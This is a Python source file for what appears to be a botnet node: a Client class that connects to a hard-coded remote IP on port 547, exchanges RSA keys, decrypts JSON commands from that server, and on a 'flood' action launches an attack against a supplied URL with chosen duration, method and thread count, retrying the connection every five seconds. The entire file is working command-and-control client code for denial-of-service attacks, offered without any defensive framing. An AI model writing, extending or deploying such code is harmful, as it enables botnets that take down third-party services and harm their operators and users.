import socket
import logging
import time
import json
from .crypto import Crypto
from . import parse_url, NetTools
from .logger import LoggerFormatter

#  Client Class 
class Client:
    def __init__(self, server_host='16.171.206.152', server_port=547, debug=True):
        self.server_host = server_host
        self.server_port = server_port
        self.crypto = Crypto()
        self.private_key, self.public_key = self.crypto.generate_rsa_keys()
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.running = True

        # Setup logging
        self.logger = logging.getLogger("node")
        self.logger.setLevel(logging.DEBUG if debug else logging.WARNING)
        if not self.logger.handlers:
            ch = logging.StreamHandler()
            ch.setLevel(logging.DEBUG if debug else logging.WARNING)
            ch.setFormatter(LoggerFormatter())
            self.logger.addHandler(ch)

    #  Connect to server 
    def connect(self):
        while self.running:
            try:
                # Connect to server
                self.sock.connect((self.server_host, self.server_port))

                # Receive server public key
                length_bytes = self._recv_n_bytes(2)
                if not length_bytes:
                    raise ConnectionError("Failed to receive server public key length")
                server_pubkey_len = int.from_bytes(length_bytes, 'big')
                server_pubkey_pem = self._recv_n_bytes(server_pubkey_len)
                if not server_pubkey_pem:
                    raise ConnectionError("Failed to receive server public key")

                self.server_public_key = self.crypto.load_public_key(server_pubkey_pem)
                self.logger.info("Received server public key")

                # Send own public key to server
                pubkey_pem = self.crypto.serialize_public_key(self.public_key)
                self.sock.send(len(pubkey_pem).to_bytes(2, 'big') + pubkey_pem)
                self.logger.info(f"Sent public key to server ({self.server_host}:{self.server_port})")

                # Start listening for messages from server
                self._listen_server()

            except (ConnectionRefusedError, TimeoutError, ConnectionError, OSError) as e:
                self.logger.warning(f"Connection failed: {e}. Retrying in 5 seconds...")
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                time.sleep(5)

            except Exception as e:
                self.logger.error(f"Unexpected error: {e}")
                break

    #  Listen for server messages 
    def _listen_server(self):
        try:
            while self.running:
                # Receive encrypted session key
                length_bytes = self._recv_n_bytes(2)
                if not length_bytes:
                    self.logger.info("Server closed connection")
                    break
                encrypted_session_key_len = int.from_bytes(length_bytes, 'big')
                encrypted_session_key = self._recv_n_bytes(encrypted_session_key_len)
                if not encrypted_session_key:
                    self.logger.warning("Failed to receive session key")
                    break

                # Receive encrypted message
                length_bytes = self._recv_n_bytes(2)
                if not length_bytes:
                    self.logger.warning("Failed to receive message length")
                    break
                encrypted_msg_len = int.from_bytes(length_bytes, 'big')
                encrypted_msg = self._recv_n_bytes(encrypted_msg_len)
                if not encrypted_msg:
                    self.logger.warning("Failed to receive message")
                    break

                # Decrypt message
                session_key = self.crypto.rsa_decrypt(self.private_key, encrypted_session_key)
                message = self.crypto.aes_decrypt(session_key, encrypted_msg).decode()
                self.logger.info(f"Received message: {message}")

                # Send ACK
                encrypted_ack = self.crypto.rsa_encrypt(self.server_public_key, b"ACK")
                self.sock.send(len(encrypted_ack).to_bytes(2, 'big') + encrypted_ack)
                self.logger.info(f"Sent ACK for message: {message}")

                # Process action
                msg_json = json.loads(message)
                action = msg_json.get("action")
                self.logger.info(f"Executing server commands")
                if action == "flood":
                    NetTools().run_attack(
                        parse_url(msg_json["data"]["url"]),
                        int(msg_json["data"]["duration"]),
                        msg_json["data"]["method"],
                        int(msg_json["data"]["threads"])
                    )
                elif action in ["ping", "status", "ack"]:
                    self.logger.debug(f"Ignoring action: {action}")
                else:
                    self.logger.warning(f"Unknown action: {action}")

        except Exception as e:
            self.logger.error(f"Error in listening thread: {e}")

        finally:
            self.sock.close()
            self.logger.info("Connection closed")

    #  Helper: Receive exact number of bytes 
    def _recv_n_bytes(self, n):
        data = b''
        while len(data) < n:
            chunk = self.sock.recv(n - len(data))
            if not chunk:
                return None
            data += chunk
        return data

    #  Close client 
    def close(self):
        self.running = False
        self.sock.close()
